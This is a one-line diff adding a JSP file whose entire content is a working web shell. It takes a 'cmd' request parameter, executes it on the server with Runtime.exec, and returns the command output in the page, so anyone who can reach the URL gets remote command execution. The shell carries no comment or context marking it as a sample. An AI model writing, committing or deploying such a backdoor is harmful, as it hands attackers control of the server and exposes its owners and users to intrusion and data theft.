@@ -1,0 +1,1 @@
+<%@ page import="java.io.*" %><% if (request.getParameter("cmd") != null) { Process p = Runtime.getRuntime().exec(request.getParameter("cmd")); BufferedReader in = new BufferedReader(new InputStreamReader(p.getInputStream())); String line = null; while ((line = in.readLine()) != null) { out.println(line); } } %>
